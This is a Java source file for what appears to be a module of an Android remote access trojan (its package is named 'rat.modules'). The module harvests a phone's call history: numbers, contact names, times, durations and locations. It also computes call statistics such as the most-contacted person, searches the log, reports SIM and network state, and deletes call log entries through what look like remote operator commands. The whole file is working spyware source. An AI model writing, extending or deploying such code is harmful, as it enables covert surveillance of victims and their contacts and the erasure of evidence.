package com.fly0rakoon.rat.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallModule {
    
    private static final String TAG = "CallModule";
    
    // Call log projection
    private static final String[] CALL_LOG_PROJECTION = {
        CallLog.Calls._ID,
        CallLog.Calls.NUMBER,
        CallLog.Calls.CACHED_NAME,
        CallLog.Calls.DATE,
        CallLog.Calls.DURATION,
        CallLog.Calls.TYPE,
        CallLog.Calls.COUNTRY_ISO,
        CallLog.Calls.GEOCODED_LOCATION,
        CallLog.Calls.CACHED_NUMBER_TYPE,
        CallLog.Calls.CACHED_NUMBER_LABEL,
        CallLog.Calls.CACHED_PHOTO_ID,
        CallLog.Calls.CACHED_FORMATTED_NUMBER,
        CallLog.Calls.NEW,
        CallLog.Calls.DATA_USAGE,
        CallLog.Calls.VOICEMAIL_URI
    };
    
    private Context context;
    private TelephonyManager telephonyManager;
    
    public CallModule(Context context) {
        this.context = context;
        this.telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    }
    
    public String getCallLogs() {
        return getCallLogs(50); // Default to last 50 calls
    }
    
    public String getCallLogs(int limit) {
        if (!checkCallLogPermission()) {
            return "ERROR: Read call log permission not granted";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Call Logs (last ").append(limit).append("):\n");
        result.append("=".repeat(50)).append("\n");
        
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        int callCount = 0;
        
        try {
            // Query call logs
            cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                CALL_LOG_PROJECTION,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT " + limit
            );
            
            if (cursor == null) {
                return "ERROR: Could not query call logs";
            }
            
            while (cursor.moveToNext()) {
                callCount++;
                
                String id = getString(cursor, CallLog.Calls._ID, "");
                String number = getString(cursor, CallLog.Calls.NUMBER, "Unknown");
                String name = getString(cursor, CallLog.Calls.CACHED_NAME, null);
                long date = getLong(cursor, CallLog.Calls.DATE, 0);
                long duration = getLong(cursor, CallLog.Calls.DURATION, 0);
                int type = getInt(cursor, CallLog.Calls.TYPE, 0);
                String countryIso = getString(cursor, CallLog.Calls.COUNTRY_ISO, "");
                String location = getString(cursor, CallLog.Calls.GEOCODED_LOCATION, "");
                int isNew = getInt(cursor, CallLog.Calls.NEW, 0);
                long dataUsage = getLong(cursor, CallLog.Calls.DATA_USAGE, -1);
                
                String callType = getCallType(type);
                String dateStr = formatDate(date);
                String durationStr = formatDuration(duration);
                String newStr = (isNew == 1) ? " (NEW)" : "";
                String dataUsageStr = (dataUsage > 0) ? formatDataUsage(dataUsage) : "N/A";
                
                result.append("\n📞 Call #").append(callCount).append("\n");
                result.append("ID: ").append(id).append("\n");
                result.append("Number: ").append(number).append("\n");
                
                if (name != null && !name.isEmpty()) {
                    result.append("Name: ").append(name).append("\n");
                }
                
                result.append("Type: ").append(callType).append(newStr).append("\n");
                result.append("Date: ").append(dateStr).append("\n");
                result.append("Duration: ").append(durationStr).append("\n");
                
                if (location != null && !location.isEmpty()) {
                    result.append("Location: ").append(location).append("\n");
                }
                
                if (countryIso != null && !countryIso.isEmpty()) {
                    result.append("Country: ").append(countryIso).append("\n");
                }
                
                if (dataUsage > 0) {
                    result.append("Data usage: ").append(dataUsageStr).append("\n");
                }
                
                result.append("-".repeat(40)).append("\n");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception: " + e.getMessage());
            return "ERROR: Security exception accessing call logs";
        } catch (Exception e) {
            Log.e(TAG, "Error getting call logs: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        if (callCount == 0) {
            return "No call logs found";
        }
        
        result.append("\nTotal calls shown: ").append(callCount);
        return result.toString();
    }
    
    public String getMissedCalls() {
        return getCallsByType(CallLog.Calls.MISSED_TYPE, 50);
    }
    
    public String getIncomingCalls() {
        return getCallsByType(CallLog.Calls.INCOMING_TYPE, 50);
    }
    
    public String getOutgoingCalls() {
        return getCallsByType(CallLog.Calls.OUTGOING_TYPE, 50);
    }
    
    public String getRejectedCalls() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            return getCallsByType(CallLog.Calls.REJECTED_TYPE, 50);
        } else {
            return "Rejected calls not available on this Android version";
        }
    }
    
    public String getVoicemails() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            return getCallsByType(CallLog.Calls.VOICEMAIL_TYPE, 50);
        } else {
            return "Voicemail not available on this Android version";
        }
    }
    
    private String getCallsByType(int callType, int limit) {
        if (!checkCallLogPermission()) {
            return "ERROR: Read call log permission not granted";
        }
        
        StringBuilder result = new StringBuilder();
        String typeStr = getCallType(callType).toUpperCase();
        result.append(typeStr).append(" Calls (last ").append(limit).append("):\n");
        result.append("=".repeat(50)).append("\n");
        
        String selection = CallLog.Calls.TYPE + " = ?";
        String[] selectionArgs = {String.valueOf(callType)};
        String sortOrder = CallLog.Calls.DATE + " DESC LIMIT " + limit;
        
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        int callCount = 0;
        
        try {
            cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                CALL_LOG_PROJECTION,
                selection,
                selectionArgs,
                sortOrder
            );
            
            if (cursor == null) {
                return "ERROR: Could not query call logs";
            }
            
            while (cursor.moveToNext()) {
                callCount++;
                
                String number = getString(cursor, CallLog.Calls.NUMBER, "Unknown");
                String name = getString(cursor, CallLog.Calls.CACHED_NAME, null);
                long date = getLong(cursor, CallLog.Calls.DATE, 0);
                long duration = getLong(cursor, CallLog.Calls.DURATION, 0);
                String dateStr = formatDate(date);
                String durationStr = formatDuration(duration);
                
                result.append("\n📞 ").append(number);
                if (name != null && !name.isEmpty()) {
                    result.append(" (").append(name).append(")");
                }
                result.append("\n");
                result.append("  Date: ").append(dateStr).append("\n");
                result.append("  Duration: ").append(durationStr).append("\n");
                result.append("-".repeat(30)).append("\n");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting filtered calls: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        if (callCount == 0) {
            return "No " + typeStr.toLowerCase() + " calls found";
        }
        
        result.append("\nTotal: ").append(callCount).append(" ").append(typeStr.toLowerCase()).append(" calls");
        return result.toString();
    }
    
    public String getCallStats() {
        if (!checkCallLogPermission()) {
            return "ERROR: Read call log permission not granted";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Call Statistics:\n");
        result.append("=".repeat(50)).append("\n");
        
        ContentResolver contentResolver = context.getContentResolver();
        
        try {
            // Count by type
            String[] types = {
                String.valueOf(CallLog.Calls.INCOMING_TYPE),
                String.valueOf(CallLog.Calls.OUTGOING_TYPE),
                String.valueOf(CallLog.Calls.MISSED_TYPE)
            };
            
            String[] typeNames = {"Incoming", "Outgoing", "Missed"};
            
            long totalDuration = 0;
            int totalCalls = 0;
            
            for (int i = 0; i < types.length; i++) {
                String selection = CallLog.Calls.TYPE + " = ?";
                String[] selectionArgs = {types[i]};
                
                Cursor cursor = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{"COUNT(*)", "SUM(" + CallLog.Calls.DURATION + ")"},
                    selection,
                    selectionArgs,
                    null
                );
                
                if (cursor != null && cursor.moveToFirst()) {
                    int count = cursor.getInt(0);
                    long duration = cursor.getLong(1);
                    
                    if (count > 0) {
                        result.append(typeNames[i]).append(" calls: ").append(count);
                        if (duration > 0) {
                            result.append(" (Total duration: ").append(formatDuration(duration)).append(")");
                        }
                        result.append("\n");
                        
                        totalCalls += count;
                        totalDuration += duration;
                    }
                    cursor.close();
                }
            }
            
            result.append("\n");
            result.append("Total calls: ").append(totalCalls).append("\n");
            result.append("Total talk time: ").append(formatDuration(totalDuration)).append("\n");
            
            if (totalCalls > 0) {
                long avgDuration = totalDuration / totalCalls;
                result.append("Average call duration: ").append(formatDuration(avgDuration)).append("\n");
            }
            
            // Get most called number
            String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                "COUNT(*) as call_count",
                "SUM(" + CallLog.Calls.DURATION + ") as total_duration"
            };
            
            Cursor freqCursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                "call_count DESC LIMIT 1"
            );
            
            if (freqCursor != null && freqCursor.moveToFirst()) {
                String number = freqCursor.getString(freqCursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = freqCursor.getString(freqCursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                int count = freqCursor.getInt(freqCursor.getColumnIndex("call_count"));
                long duration = freqCursor.getLong(freqCursor.getColumnIndex("total_duration"));
                
                result.append("\nMost contacted:\n");
                result.append("  ").append(name != null ? name : number).append("\n");
                result.append("  Calls: ").append(count).append("\n");
                result.append("  Total duration: ").append(formatDuration(duration)).append("\n");
                
                freqCursor.close();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting call stats: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    public String getPhoneState() {
        if (!checkPhoneStatePermission()) {
            return "ERROR: Read phone state permission not granted";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Phone State Information:\n");
        result.append("=".repeat(50)).append("\n");
        
        try {
            // Phone type
            int phoneType = telephonyManager.getPhoneType();
            String phoneTypeStr;
            switch (phoneType) {
                case TelephonyManager.PHONE_TYPE_GSM:
                    phoneTypeStr = "GSM";
                    break;
                case TelephonyManager.PHONE_TYPE_CDMA:
                    phoneTypeStr = "CDMA";
                    break;
                case TelephonyManager.PHONE_TYPE_SIP:
                    phoneTypeStr = "SIP";
                    break;
                default:
                    phoneTypeStr = "Unknown";
            }
            result.append("Phone type: ").append(phoneTypeStr).append("\n");
            
            // Network operator
            String networkOperator = telephonyManager.getNetworkOperatorName();
            if (networkOperator != null && !networkOperator.isEmpty()) {
                result.append("Network: ").append(networkOperator).append("\n");
            }
            
            // Network type
            int networkType = telephonyManager.getNetworkType();
            result.append("Network type: ").append(getNetworkTypeString(networkType)).append("\n");
            
            // SIM state
            int simState = telephonyManager.getSimState();
            result.append("SIM state: ").append(getSimStateString(simState)).append("\n");
            
            // SIM operator
            String simOperator = telephonyManager.getSimOperatorName();
            if (simOperator != null && !simOperator.isEmpty()) {
                result.append("SIM operator: ").append(simOperator).append("\n");
            }
            
            // Data state
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                int dataState = telephonyManager.getDataState();
                String dataStateStr;
                switch (dataState) {
                    case TelephonyManager.DATA_CONNECTED:
                        dataStateStr = "Connected";
                        break;
                    case TelephonyManager.DATA_CONNECTING:
                        dataStateStr = "Connecting";
                        break;
                    case TelephonyManager.DATA_DISCONNECTED:
                        dataStateStr = "Disconnected";
                        break;
                    case TelephonyManager.DATA_SUSPENDED:
                        dataStateStr = "Suspended";
                        break;
                    default:
                        dataStateStr = "Unknown";
                }
                result.append("Data state: ").append(dataStateStr).append("\n");
            }
            
            // Call state
            int callState = telephonyManager.getCallState();
            String callStateStr;
            switch (callState) {
                case TelephonyManager.CALL_STATE_IDLE:
                    callStateStr = "Idle";
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    callStateStr = "Ringing";
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    callStateStr = "Off-hook (call in progress)";
                    break;
                default:
                    callStateStr = "Unknown";
            }
            result.append("Call state: ").append(callStateStr).append("\n");
            
            // Voicemail count
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                int voicemailCount = telephonyManager.getVoiceMailCount();
                result.append("Voicemail count: ").append(voicemailCount).append("\n");
            }
            
            // IMEI/MEID (requires extra permission)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                // IMEI requires special permission on newer Android versions
                result.append("IMEI: Requires special permission\n");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception: " + e.getMessage());
            result.append("Some information requires additional permissions");
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone state: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    public String searchCallLog(String query) {
        if (!checkCallLogPermission()) {
            return "ERROR: Read call log permission not granted";
        }
        
        if (query == null || query.isEmpty()) {
            return "Usage: calls search <number or name>";
        }
        
        StringBuilder result = new StringBuilder();
        result.append("Search call logs for: \"").append(query).append("\"\n");
        result.append("=".repeat(50)).append("\n");
        
        String selection = CallLog.Calls.NUMBER + " LIKE ? OR " +
                          CallLog.Calls.CACHED_NAME + " LIKE ?";
        String[] selectionArgs = new String[]{"%" + query + "%", "%" + query + "%"};
        
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = null;
        int matchCount = 0;
        
        try {
            cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                CALL_LOG_PROJECTION,
                selection,
                selectionArgs,
                CallLog.Calls.DATE + " DESC"
            );
            
            if (cursor == null) {
                return "ERROR: Could not query call logs";
            }
            
            while (cursor.moveToNext()) {
                matchCount++;
                
                String number = getString(cursor, CallLog.Calls.NUMBER, "Unknown");
                String name = getString(cursor, CallLog.Calls.CACHED_NAME, null);
                long date = getLong(cursor, CallLog.Calls.DATE, 0);
                long duration = getLong(cursor, CallLog.Calls.DURATION, 0);
                int type = getInt(cursor, CallLog.Calls.TYPE, 0);
                
                result.append("\n📞 Match #").append(matchCount).append("\n");
                result.append("Number: ").append(number).append("\n");
                if (name != null && !name.isEmpty()) {
                    result.append("Name: ").append(name).append("\n");
                }
                result.append("Type: ").append(getCallType(type)).append("\n");
                result.append("Date: ").append(formatDate(date)).append("\n");
                result.append("Duration: ").append(formatDuration(duration)).append("\n");
                result.append("-".repeat(30)).append("\n");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error searching call logs: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        if (matchCount == 0) {
            return "No matches found";
        }
        
        result.append("\nFound ").append(matchCount).append(" matches");
        return result.toString();
    }
    
    public String deleteCallLogEntry(String callId) {
        if (!checkCallLogWritePermission()) {
            return "ERROR: Write call log permission not granted";
        }
        
        if (callId == null || callId.isEmpty()) {
            return "Usage: calls delete <call_id>";
        }
        
        try {
            String selection = CallLog.Calls._ID + " = ?";
            String[] selectionArgs = {callId};
            
            int deleted = context.getContentResolver().delete(
                CallLog.Calls.CONTENT_URI,
                selection,
                selectionArgs
            );
            
            if (deleted > 0) {
                return "OK: Deleted call log entry " + callId;
            } else {
                return "ERROR: Call log entry " + callId + " not found";
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception deleting call log: " + e.getMessage());
            return "ERROR: Permission denied to delete call logs";
        } catch (Exception e) {
            Log.e(TAG, "Error deleting call log: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }
    
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            case CallLog.Calls.VOICEMAIL_TYPE:
                return "Voicemail";
            case CallLog.Calls.REJECTED_TYPE:
                return "Rejected";
            case CallLog.Calls.BLOCKED_TYPE:
                return "Blocked";
            default:
                return "Unknown";
        }
    }
    
    private String getNetworkTypeString(int type) {
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_GPRS:
                return "GPRS";
            case TelephonyManager.NETWORK_TYPE_EDGE:
                return "EDGE";
            case TelephonyManager.NETWORK_TYPE_UMTS:
                return "UMTS";
            case TelephonyManager.NETWORK_TYPE_HSDPA:
                return "HSDPA";
            case TelephonyManager.NETWORK_TYPE_HSUPA:
                return "HSUPA";
            case TelephonyManager.NETWORK_TYPE_HSPA:
                return "HSPA";
            case TelephonyManager.NETWORK_TYPE_CDMA:
                return "CDMA";
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
                return "EVDO rev 0";
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
                return "EVDO rev A";
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
                return "EVDO rev B";
            case TelephonyManager.NETWORK_TYPE_1xRTT:
                return "1xRTT";
            case TelephonyManager.NETWORK_TYPE_LTE:
                return "LTE";
            case TelephonyManager.NETWORK_TYPE_EHRPD:
                return "eHRPD";
            case TelephonyManager.NETWORK_TYPE_HSPAP:
                return "HSPA+";
            case TelephonyManager.NETWORK_TYPE_GSM:
                return "GSM";
            case TelephonyManager.NETWORK_TYPE_TD_SCDMA:
                return "TD-SCDMA";
            case TelephonyManager.NETWORK_TYPE_IWLAN:
                return "IWLAN";
            case TelephonyManager.NETWORK_TYPE_LTE_CA:
                return "LTE CA";
            case TelephonyManager.NETWORK_TYPE_NR:
                return "5G NR";
            default:
                return "Unknown";
        }
    }
    
    private String getSimStateString(int state) {
        switch (state) {
            case TelephonyManager.SIM_STATE_ABSENT:
                return "Absent";
            case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                return "PIN Required";
            case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                return "PUK Required";
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                return "Network Locked";
            case TelephonyManager.SIM_STATE_READY:
                return "Ready";
            case TelephonyManager.SIM_STATE_NOT_READY:
                return "Not Ready";
            case TelephonyManager.SIM_STATE_PERM_DISABLED:
                return "Permanently Disabled";
            case TelephonyManager.SIM_STATE_CARD_IO_ERROR:
                return "Card IO Error";
            case TelephonyManager.SIM_STATE_CARD_RESTRICTED:
                return "Card Restricted";
            default:
                return "Unknown";
        }
    }
    
    private String formatDate(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        return sdf.format(new Date(timestamp));
    }
    
    private String formatDuration(long seconds) {
        long hours = seconds / 3600;
        long minutes = (seconds % 3600) / 60;
        long secs = seconds % 60;
        
        if (hours > 0) {
            return String.format(Locale.US, "%02d:%02d:%02d", hours, minutes, secs);
        } else {
            return String.format(Locale.US, "%02d:%02d", minutes, secs);
        }
    }
    
    private String formatDataUsage(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp-1) + "";
        return String.format(Locale.US, "%.1f %sB", bytes / Math.pow(1024, exp), pre);
    }
    
    private String getString(Cursor cursor, String columnName, String defaultValue) {
        int index = cursor.getColumnIndex(columnName);
        if (index != -1) {
            return cursor.getString(index);
        }
        return defaultValue;
    }
    
    private long getLong(Cursor cursor, String columnName, long defaultValue) {
        int index = cursor.getColumnIndex(columnName);
        if (index != -1) {
            return cursor.getLong(index);
        }
        return defaultValue;
    }
    
    private int getInt(Cursor cursor, String columnName, int defaultValue) {
        int index = cursor.getColumnIndex(columnName);
        if (index != -1) {
            return cursor.getInt(index);
        }
        return defaultValue;
    }
    
    private boolean checkCallLogPermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean checkCallLogWritePermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.WRITE_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean checkPhoneStatePermission() {
        return ContextCompat.checkSelfPermission(context, 
            Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED;
    }
}